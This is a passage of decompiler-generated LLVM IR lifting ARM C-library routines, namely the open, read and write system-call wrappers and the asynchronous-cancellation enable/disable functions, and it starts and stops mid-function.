  %v0_12da8 = call i32 @__syscall_error()
  br label %dec_label_pc_12dac

dec_label_pc_12dac:                               ; preds = %entry.dec_label_pc_12dac_crit_edge, %bb7
  %v3_12dac = phi i32 [ %v3_12dac.pre, %entry.dec_label_pc_12dac_crit_edge ], [ %v0_12da8, %bb7 ]
  %v9_12dac = load i32, i32* @r7, align 4
  store i32 %v9_12dac, i32* %stack_var_-8, align 4
  %v12_12dac = load i32, i32* @lr, align 4
  %v0_12db0 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_12db0, i32* @ip, align 4
  store i32 %v3_12dac, i32* @r7, align 4
  %v1_12dcc = call i32 @__libc_disable_asynccancel(i32 %v0_12db0)
  %v0_12dd0 = load i32, i32* @r7, align 4
  store i32 %v0_12dd0, i32* @r0, align 4
  %v2_12dd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12dd4, i32* @r7, align 4
  store i32 %v12_12dac, i32* @lr, align 4
  %v2_12dd8 = icmp ugt i32 %v0_12dd0, -4097
  %v7_12dd8 = icmp eq i32 %v0_12dd0, -4096
  store i1 %v7_12dd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12dd8, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_12dac
  %v0_12de0 = call i32 @__syscall_error()
  %v0_12df0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12df0, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_12df0 = load i32, i32* @r1, align 4
  %v2_12df0 = load i32, i32* @r4, align 4
  %v4_12df0 = and i32 %v2_12df0, %v1_12df0
  store i32 %v4_12df0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_12de0, { 1, 0 }
  uselistorder i32 %v0_12dd0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12da0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12dac, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_12e04 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12e04, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12e04 = load i32, i32* @r0, align 4
  ret i32 %v2_12e04

bb1:                                              ; preds = %entry
  %v0_12e08 = call i32 @__syscall_error()
  ret i32 %v0_12e08
}

define i32 @__libc_open(i32 %arg1, i64* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = ptrtoint i64* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_12e14 = load i32, i32* @global_var_23e80.759, align 4
  %v2_12e18 = icmp eq i32 %v3_12e14, 0
  store i1 %v2_12e18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e18, label %dec_label_pc_12e20, label %entry.dec_label_pc_12e3c_crit_edge

entry.dec_label_pc_12e3c_crit_edge:               ; preds = %entry
  %v3_12e3c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12e3c

dec_label_pc_12e20:                               ; preds = %entry
  %v0_12e30 = load i32, i32* @r0, align 4
  %v2_12e30 = icmp ugt i32 %v0_12e30, -4097
  %v7_12e30 = icmp eq i32 %v0_12e30, -4096
  store i1 %v7_12e30, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e30, label %bb11, label %bb

bb:                                               ; preds = %bb13, %bb12, %dec_label_pc_12e3c, %dec_label_pc_12e20
  %merge = phi i32 [ %v0_12e30, %dec_label_pc_12e20 ], [ %v0_12e60, %dec_label_pc_12e3c ], [ %v0_12e70, %bb12 ], [ %v7_12e80, %bb13 ]
  ret i32 %merge

bb11:                                             ; preds = %dec_label_pc_12e20
  %v0_12e38 = call i32 @__syscall_error()
  br label %dec_label_pc_12e3c

dec_label_pc_12e3c:                               ; preds = %entry.dec_label_pc_12e3c_crit_edge, %bb11
  %v3_12e3c = phi i32 [ %v3_12e3c.pre, %entry.dec_label_pc_12e3c_crit_edge ], [ %v0_12e38, %bb11 ]
  store i32 %v3_12e3c, i32* %stack_var_-24, align 4
  %v12_12e3c = load i32, i32* @r2, align 4
  %v15_12e3c = load i32, i32* @r3, align 4
  %v18_12e3c = load i32, i32* @r7, align 4
  store i32 %v18_12e3c, i32* %stack_var_-8, align 4
  %v21_12e3c = load i32, i32* @lr, align 4
  %v0_12e40 = call i32 @__libc_enable_asynccancel()
  %v2_12e48 = load i32, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %v12_12e3c, i32* @r2, align 4
  store i32 %v15_12e3c, i32* @r3, align 4
  store i32 %v2_12e48, i32* @r7, align 4
  %v1_12e5c = call i32 @__libc_disable_asynccancel(i32 %v0_12e40)
  %v0_12e60 = load i32, i32* @r7, align 4
  store i32 %v0_12e60, i32* @r0, align 4
  %v2_12e64 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12e64, i32* @r7, align 4
  store i32 %v21_12e3c, i32* @lr, align 4
  %v2_12e68 = icmp ugt i32 %v0_12e60, -4097
  %v7_12e68 = icmp eq i32 %v0_12e60, -4096
  store i1 %v7_12e68, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12e68, label %bb12, label %bb

bb12:                                             ; preds = %dec_label_pc_12e3c
  %v0_12e70 = call i32 @__syscall_error()
  %v0_12e80 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12e80, label %bb13, label %bb

bb13:                                             ; preds = %bb12
  %v1_12e80 = load i32, i32* @r1, align 4
  %v2_12e80 = inttoptr i32 %v1_12e80 to i64*
  %v3_12e80 = load i64, i64* %v2_12e80, align 4
  %v4_12e80 = load i32, i32* @r4, align 4
  %v5_12e80 = trunc i64 %v3_12e80 to i32
  %v6_12e80 = udiv i64 %v3_12e80, 4294967296
  %v7_12e80 = trunc i64 %v6_12e80 to i32
  %v9_12e80 = sub i32 %v5_12e80, %v4_12e80
  store i32 %v9_12e80, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_12e60, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12e30, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12e3c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_12e94 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12e94, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12e94 = load i32, i32* @r0, align 4
  ret i32 %v2_12e94

bb1:                                              ; preds = %entry
  %v0_12e98 = call i32 @__syscall_error()
  ret i32 %v0_12e98
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12ea4 = load i32, i32* @global_var_23e80.759, align 4
  %v2_12ea8 = icmp eq i32 %v3_12ea4, 0
  store i1 %v2_12ea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ea8, label %dec_label_pc_12eb0, label %entry.dec_label_pc_12ecc_crit_edge

entry.dec_label_pc_12ecc_crit_edge:               ; preds = %entry
  %v3_12ecc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12ecc

dec_label_pc_12eb0:                               ; preds = %entry
  %v0_12ec0 = load i32, i32* @r0, align 4
  %v2_12ec0 = icmp ugt i32 %v0_12ec0, -4097
  %v7_12ec0 = icmp eq i32 %v0_12ec0, -4096
  store i1 %v7_12ec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ec0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_12ecc, %dec_label_pc_12eb0
  %merge = phi i32 [ %v0_12ec0, %dec_label_pc_12eb0 ], [ %v0_12ef0, %dec_label_pc_12ecc ], [ %v0_12f00, %bb10 ], [ %v6_12f10, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_12eb0
  %v0_12ec8 = call i32 @__syscall_error()
  br label %dec_label_pc_12ecc

dec_label_pc_12ecc:                               ; preds = %entry.dec_label_pc_12ecc_crit_edge, %bb9
  %v3_12ecc = phi i32 [ %v3_12ecc.pre, %entry.dec_label_pc_12ecc_crit_edge ], [ %v0_12ec8, %bb9 ]
  %v12_12ecc = load i32, i32* @r3, align 4
  %v15_12ecc = load i32, i32* @r7, align 4
  store i32 %v15_12ecc, i32* %stack_var_-8, align 4
  %v18_12ecc = load i32, i32* @lr, align 4
  %v0_12ed0 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_12ecc, i32* @r3, align 4
  store i32 %v3_12ecc, i32* @r7, align 4
  %v1_12eec = call i32 @__libc_disable_asynccancel(i32 %v0_12ed0)
  %v0_12ef0 = load i32, i32* @r7, align 4
  store i32 %v0_12ef0, i32* @r0, align 4
  %v2_12ef4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12ef4, i32* @r7, align 4
  store i32 %v18_12ecc, i32* @lr, align 4
  %v2_12ef8 = icmp ugt i32 %v0_12ef0, -4097
  %v7_12ef8 = icmp eq i32 %v0_12ef0, -4096
  store i1 %v7_12ef8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_12ef8, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_12ecc
  %v0_12f00 = call i32 @__syscall_error()
  %v0_12f10 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_12f10, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_12f10 = load i32, i32* @r1, align 4
  %v2_12f10 = load i32, i32* @r4, align 4
  %v5_12f10 = sdiv i32 %v2_12f10, 1073741824
  %v6_12f10 = and i32 %v5_12f10, %v1_12f10
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_12ef0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_12ec0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_12ecc, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_12f24 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_12f24, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_12f24 = load i32, i32* @r0, align 4
  ret i32 %v2_12f24

bb1:                                              ; preds = %entry
  %v0_12f28 = call i32 @__syscall_error()
  ret i32 %v0_12f28

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_12f34 = load i32, i32* @global_var_23e80.759, align 4
  %v2_12f38 = icmp eq i32 %v3_12f34, 0
  br i1 %v2_12f38, label %dec_label_pc_12f40, label %entry.dec_label_pc_12f5c_crit_edge

entry.dec_label_pc_12f5c_crit_edge:               ; preds = %entry
  %v3_12f5c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_12f5c

dec_label_pc_12f40:                               ; preds = %entry
  %v0_12f50 = load i32, i32* @r0, align 4
  %v2_12f50 = icmp ugt i32 %v0_12f50, -4097
  br i1 %v2_12f50, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_12f5c, %dec_label_pc_12f40
  %merge = phi i32 [ %v0_12f50, %dec_label_pc_12f40 ], [ %v0_12f80, %dec_label_pc_12f5c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_12f40
  %v0_12f58 = call i32 @__syscall_error()
  br label %dec_label_pc_12f5c

dec_label_pc_12f5c:                               ; preds = %entry.dec_label_pc_12f5c_crit_edge, %bb8
  %v3_12f5c = phi i32 [ %v3_12f5c.pre, %entry.dec_label_pc_12f5c_crit_edge ], [ %v0_12f58, %bb8 ]
  %v6_12f5c = load i32, i32* @r1, align 4
  %v15_12f5c = load i32, i32* @r7, align 4
  store i32 %v15_12f5c, i32* %stack_var_-8, align 4
  %v18_12f5c = load i32, i32* @lr, align 4
  %v0_12f60 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_12f5c, i32* @r1, align 4
  store i32 %v3_12f5c, i32* @r7, align 4
  %v1_12f7c = call i32 @__libc_disable_asynccancel(i32 %v0_12f60)
  %v0_12f80 = load i32, i32* @r7, align 4
  store i32 %v0_12f80, i32* @r0, align 4
  %v2_12f84 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_12f84, i32* @r7, align 4
  store i32 %v18_12f5c, i32* @lr, align 4
  %v2_12f88 = icmp ugt i32 %v0_12f80, -4097
  br i1 %v2_12f88, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_12f5c
  %v0_12f90 = call i32 @__syscall_error()
  ret i32 %v0_12f90

; uselistorder directives
  uselistorder i32 %v0_12f80, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_12f5c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_12fa0 = load i32, i32* %r0.global-to-local, align 4
  %v1_12fa0 = and i32 %v0_12fa0, 2
  %v2_12fa0 = icmp eq i32 %v1_12fa0, 0
  %v3_12fa4 = load i32, i32* @r4, align 4
  store i32 %v3_12fa4, i32* %stack_var_-16, align 4
  br i1 %v2_12fa0, label %dec_label_pc_12fac, label %dec_label_pc_13020

dec_label_pc_12fac:                               ; preds = %entry
  %v0_12fac = call i32 @__aeabi_read_tp()
  store i32 %v0_12fac, i32* %r0.global-to-local, align 4
  %v1_12fb0 = add i32 %v0_12fac, -1036
  %v2_12fb0 = inttoptr i32 %v1_12fb0 to i32*
  %v3_12fb0 = load i32, i32* %v2_12fb0, align 4
  %v1_12fb4 = add i32 %v0_12fac, -1168
  store i32 %v1_12fb4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12fb8

dec_label_pc_12fb8:                               ; preds = %dec_label_pc_12fec.dec_label_pc_12fb8_crit_edge, %dec_label_pc_12fac
  %v0_12fc4 = phi i32 [ %v0_12fc4.pre, %dec_label_pc_12fec.dec_label_pc_12fb8_crit_edge ], [ %v1_12fb4, %dec_label_pc_12fac ]
  %v0_12fb8 = phi i32 [ %v0_12fec, %dec_label_pc_12fec.dec_label_pc_12fb8_crit_edge ], [ %v3_12fb0, %dec_label_pc_12fac ]
  %v1_12fb8 = and i32 %v0_12fb8, -3
  store i32 %v1_12fb8, i32* %r7.global-to-local, align 4
  store i32 %v0_12fb8, i32* %r4.global-to-local, align 4
  store i32 %v1_12fb8, i32* @r1, align 4
  %v1_12fc4 = add i32 %v0_12fc4, 132
  store i32 %v1_12fc4, i32* @r2, align 4
  %v1_12fc823 = inttoptr i32 %v1_12fc4 to i32*
  %v2_12fc824 = load i32, i32* %v1_12fc823, align 4
  %v3_12fcc26 = icmp uge i32 %v2_12fc824, %v0_12fb8
  store i1 %v3_12fcc26, i1* %cpsr_c.global-to-local, align 1
  %v9_12fcc32 = icmp eq i32 %v2_12fc824, %v0_12fb8
  br i1 %v9_12fcc32, label %dec_label_pc_12fd4, label %dec_label_pc_12fec

dec_label_pc_12fd4:                               ; preds = %dec_label_pc_12fb8, %dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge
  %v0_12fd433 = phi i32 [ %v1_12fcc.pre, %dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge ], [ %v0_12fb8, %dec_label_pc_12fb8 ]
  store i32 %v0_12fd433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_12fe4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_12fe4, label %dec_label_pc_12fe8, label %dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge

dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge:  ; preds = %dec_label_pc_12fd4
  %v0_12fc8.pre = load i32, i32* @r2, align 4
  %v1_12fcc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_12fc8 = inttoptr i32 %v0_12fc8.pre to i32*
  %v2_12fc8 = load i32, i32* %v1_12fc8, align 4
  %v3_12fcc = icmp uge i32 %v2_12fc8, %v1_12fcc.pre
  store i1 %v3_12fcc, i1* %cpsr_c.global-to-local, align 1
  %v9_12fcc = icmp eq i32 %v2_12fc8, %v1_12fcc.pre
  br i1 %v9_12fcc, label %dec_label_pc_12fd4, label %dec_label_pc_12fec

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12fd4
  %v0_12fe8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12fec

dec_label_pc_12fec:                               ; preds = %dec_label_pc_12fb8, %dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge, %dec_label_pc_12fe8
  %v0_12fec = phi i32 [ %v0_12fe8, %dec_label_pc_12fe8 ], [ %v2_12fc824, %dec_label_pc_12fb8 ], [ %v2_12fc8, %dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge ]
  %v1_12fec = phi i32 [ %v0_12fe8, %dec_label_pc_12fe8 ], [ %v0_12fb8, %dec_label_pc_12fb8 ], [ %v1_12fcc.pre, %dec_label_pc_12fd4.dec_label_pc_12fc8_crit_edge ]
  %v3_12fec = icmp uge i32 %v0_12fec, %v1_12fec
  store i1 %v3_12fec, i1* %cpsr_c.global-to-local, align 1
  %v9_12fec = icmp eq i32 %v0_12fec, %v1_12fec
  br i1 %v9_12fec, label %dec_label_pc_13014.preheader, label %dec_label_pc_12fec.dec_label_pc_12fb8_crit_edge

dec_label_pc_12fec.dec_label_pc_12fb8_crit_edge:  ; preds = %dec_label_pc_12fec
  %v0_12fc4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_12fb8

dec_label_pc_13014.preheader:                     ; preds = %dec_label_pc_12fec
  %v0_130141 = load i32, i32* %r7.global-to-local, align 4
  %v1_130142 = and i32 %v0_130141, 12
  store i32 %v1_130142, i32* @r3, align 4
  %v2_130183 = icmp ugt i32 %v1_130142, 3
  store i1 %v2_130183, i1* %cpsr_c.global-to-local, align 1
  %v7_130185 = icmp eq i32 %v1_130142, 4
  br i1 %v7_130185, label %dec_label_pc_12ff8.lr.ph, label %dec_label_pc_13014.preheader.dec_label_pc_13020.loopexit_crit_edge

dec_label_pc_13014.preheader.dec_label_pc_13020.loopexit_crit_edge: ; preds = %dec_label_pc_13014.preheader
  %v1_13024.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13020.loopexit

dec_label_pc_12ff8.lr.ph:                         ; preds = %dec_label_pc_13014.preheader
  %v0_12ffc.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_12ffc = add i32 %v0_12ffc.pre, 132
  %v2_13010 = inttoptr i32 %v1_12ffc to i32*
  br label %dec_label_pc_12ff8

dec_label_pc_12ff8:                               ; preds = %dec_label_pc_12ff8.lr.ph, %dec_label_pc_12ff8
  %v0_12ff8 = phi i32 [ %v0_130141, %dec_label_pc_12ff8.lr.ph ], [ %v3_13010, %dec_label_pc_12ff8 ]
  store i32 %v0_12ff8, i32* @r2, align 4
  store i32 %v1_12ffc, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_13010 = load i32, i32* %v2_13010, align 4
  store i32 %v3_13010, i32* %r7.global-to-local, align 4
  %v1_13014 = and i32 %v3_13010, 12
  store i32 %v1_13014, i32* @r3, align 4
  %v7_13018 = icmp eq i32 %v1_13014, 4
  br i1 %v7_13018, label %dec_label_pc_12ff8, label %dec_label_pc_13014.dec_label_pc_13020.loopexit_crit_edge

dec_label_pc_13014.dec_label_pc_13020.loopexit_crit_edge: ; preds = %dec_label_pc_12ff8
  %v2_13018 = icmp ugt i32 %v1_13014, 3
  store i1 %v2_13018, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_13020.loopexit

dec_label_pc_13020.loopexit:                      ; preds = %dec_label_pc_13014.preheader.dec_label_pc_13020.loopexit_crit_edge, %dec_label_pc_13014.dec_label_pc_13020.loopexit_crit_edge
  %v1_13024.pre = phi i32 [ %v1_13024.pre.pre, %dec_label_pc_13014.preheader.dec_label_pc_13020.loopexit_crit_edge ], [ %v1_12ffc, %dec_label_pc_13014.dec_label_pc_13020.loopexit_crit_edge ]
  %v2_13020.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_13020

dec_label_pc_13020:                               ; preds = %dec_label_pc_13020.loopexit, %entry
  %v1_13024 = phi i32 [ %v1_13024.pre, %dec_label_pc_13020.loopexit ], [ %v0_12fa0, %entry ]
  %v2_13020 = phi i32 [ %v2_13020.pre, %dec_label_pc_13020.loopexit ], [ %v3_12fa4, %entry ]
  store i32 %v2_13020, i32* @r4, align 4
  ret i32 %v1_13024

; uselistorder directives
  uselistorder i32 %v3_13010, { 1, 2, 0 }
  uselistorder i32 %v1_12ffc, { 0, 2, 1 }
  uselistorder i32 %v0_12fe8, { 1, 0 }
  uselistorder i32 %v1_12fcc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_12fb8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 0, 2, 5, 4, 1 }
  uselistorder label %dec_label_pc_13020.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_12ff8, { 1, 0 }
  uselistorder label %dec_label_pc_12fec, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12fd4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_13028 = load i32, i32* @r4, align 4
  store i32 %v3_13028, i32* %stack_var_-24, align 4
  store i32 56496, i32* %r8.global-to-local, align 4
  %v0_13030 = call i32 @__aeabi_read_tp()
  %v1_13034 = add i32 %v0_13030, -1036
  %v2_13034 = inttoptr i32 %v1_13034 to i32*
  %v3_13034 = load i32, i32* %v2_13034, align 4
  store i32 %v3_13034, i32* %r6.global-to-local, align 4
  %v1_13038 = add i32 %v0_13030, -1168
  store i32 %v1_13038, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r8.global-to-local, align 4
  %v1_1304046 = or i32 %v3_13034, 2
  store i32 %v1_1304046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1304449 = icmp eq i32 %v1_1304046, %v3_13034
  br i1 %v9_1304449, label %dec_label_pc_130f0, label %dec_label_pc_1304c

dec_label_pc_1304c:                               ; preds = %entry, %bb.dec_label_pc_1304c_crit_edge
  %v0_13050 = phi i32 [ %v0_13050.pre, %bb.dec_label_pc_1304c_crit_edge ], [ %v1_13038, %entry ]
  %v1_1304051 = phi i32 [ %v1_13040, %bb.dec_label_pc_1304c_crit_edge ], [ %v1_1304046, %entry ]
  %v0_1305450 = phi i32 [ %v1_13080, %bb.dec_label_pc_1304c_crit_edge ], [ %v3_13034, %entry ]
  store i32 %v1_1304051, i32* @r1, align 4
  %v1_13050 = add i32 %v0_13050, 132
  store i32 %v1_13050, i32* %r2.global-to-local, align 4
  store i32 %v0_1305450, i32* %r4.global-to-local, align 4
  %v1_1305834 = inttoptr i32 %v1_13050 to i32*
  %v2_1305835 = load i32, i32* %v1_1305834, align 4
  store i32 %v2_1305835, i32* @r3, align 4
  %v3_1305c37 = icmp uge i32 %v2_1305835, %v0_1305450
  store i1 %v3_1305c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1305c43 = icmp eq i32 %v2_1305835, %v0_1305450
  br i1 %v9_1305c43, label %dec_label_pc_13064, label %dec_label_pc_1307c

dec_label_pc_13064:                               ; preds = %dec_label_pc_1304c, %dec_label_pc_13064.dec_label_pc_13058_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_13074 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_13074, label %dec_label_pc_13078, label %dec_label_pc_13064.dec_label_pc_13058_crit_edge

dec_label_pc_13064.dec_label_pc_13058_crit_edge:  ; preds = %dec_label_pc_13064
  %v0_13058.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1305c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_13058 = inttoptr i32 %v0_13058.pre to i32*
  %v2_13058 = load i32, i32* %v1_13058, align 4
  store i32 %v2_13058, i32* @r3, align 4
  %v3_1305c = icmp uge i32 %v2_13058, %v1_1305c.pre
  store i1 %v3_1305c, i1* %cpsr_c.global-to-local, align 1
  %v9_1305c = icmp eq i32 %v2_13058, %v1_1305c.pre
  br i1 %v9_1305c, label %dec_label_pc_13064, label %dec_label_pc_1307c

dec_label_pc_13078:                               ; preds = %dec_label_pc_13064
  %v0_13078 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_13078, i32* @r3, align 4
  br label %dec_label_pc_1307c

dec_label_pc_1307c:                               ; preds = %dec_label_pc_1304c, %dec_label_pc_13064.dec_label_pc_13058_crit_edge, %dec_label_pc_13078
  %v1_13080 = phi i32 [ %v0_13078, %dec_label_pc_13078 ], [ %v2_1305835, %dec_label_pc_1304c ], [ %v2_13058, %dec_label_pc_13064.dec_label_pc_13058_crit_edge ]
  %v1_1307c = load i32, i32* %r6.global-to-local, align 4
  %v3_1307c = icmp uge i32 %v1_13080, %v1_1307c
  store i1 %v3_1307c, i1* %cpsr_c.global-to-local, align 1
  %v9_1307c = icmp eq i32 %v1_13080, %v1_1307c
  br i1 %v9_1307c, label %dec_label_pc_13088, label %bb

bb:                                               ; preds = %dec_label_pc_1307c
  store i32 %v1_13080, i32* %r6.global-to-local, align 4
  %v1_13040 = or i32 %v1_13080, 2
  store i32 %v1_13040, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_13044 = icmp eq i32 %v1_13040, %v1_13080
  br i1 %v9_13044, label %dec_label_pc_130f0, label %bb.dec_label_pc_1304c_crit_edge

bb.dec_label_pc_1304c_crit_edge:                  ; preds = %bb
  %v0_13050.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1304c

dec_label_pc_13088:                               ; preds = %dec_label_pc_1307c
  %v0_13088 = load i32, i32* %r5.global-to-local, align 4
  %v1_13088 = and i32 %v0_13088, -69
  store i32 %v1_13088, i32* @r3, align 4
  %v2_1308c = icmp ugt i32 %v1_13088, 9
  store i1 %v2_1308c, i1* %cpsr_c.global-to-local, align 1
  %v7_1308c = icmp eq i32 %v1_13088, 10
  br i1 %v7_1308c, label %dec_label_pc_13094, label %dec_label_pc_130f0

dec_label_pc_13094:                               ; preds = %dec_label_pc_13088
  %v1_13098 = load i32, i32* %r7.global-to-local, align 4
  %v2_13098 = add i32 %v1_13098, 544
  %v3_13098 = inttoptr i32 %v2_13098 to i32*
  store i32 -1, i32* %v3_13098, align 4
  %v0_1309c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_1309c, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_130a0

dec_label_pc_130a0:                               ; preds = %dec_label_pc_130d4.dec_label_pc_130a0_crit_edge, %dec_label_pc_13094
  %v0_130a4 = phi i32 [ %v0_130a4.pre, %dec_label_pc_130d4.dec_label_pc_130a0_crit_edge ], [ %v0_1309c, %dec_label_pc_13094 ]
  %v0_130a0 = load i32, i32* %r7.global-to-local, align 4
  %v1_130a0 = add i32 %v0_130a0, 132
  %v2_130a0 = inttoptr i32 %v1_130a0 to i32*
  %v3_130a0 = load i32, i32* %v2_130a0, align 4
  store i32 %v0_130a4, i32* %r2.global-to-local, align 4
  store i32 %v3_130a0, i32* %r4.global-to-local, align 4
  %v1_130ac = or i32 %v3_130a0, 16
  store i32 %v1_130ac, i32* @r1, align 4
  %v1_130b022 = inttoptr i32 %v0_130a4 to i32*
  %v2_130b023 = load i32, i32* %v1_130b022, align 4
  %v3_130b425 = icmp uge i32 %v2_130b023, %v3_130a0
  store i1 %v3_130b425, i1* %cpsr_c.global-to-local, align 1
  %v9_130b431 = icmp eq i32 %v2_130b023, %v3_130a0
  br i1 %v9_130b431, label %dec_label_pc_130bc, label %dec_label_pc_130d4

dec_label_pc_130bc:                               ; preds = %dec_label_pc_130a0, %dec_label_pc_130bc.dec_label_pc_130b0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_130cc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_130cc, label %dec_label_pc_130d0, label %dec_label_pc_130bc.dec_label_pc_130b0_crit_edge

dec_label_pc_130bc.dec_label_pc_130b0_crit_edge:  ; preds = %dec_label_pc_130bc
  %v0_130b0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_130b4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_130b0 = inttoptr i32 %v0_130b0.pre to i32*
  %v2_130b0 = load i32, i32* %v1_130b0, align 4
  %v3_130b4 = icmp uge i32 %v2_130b0, %v1_130b4.pre
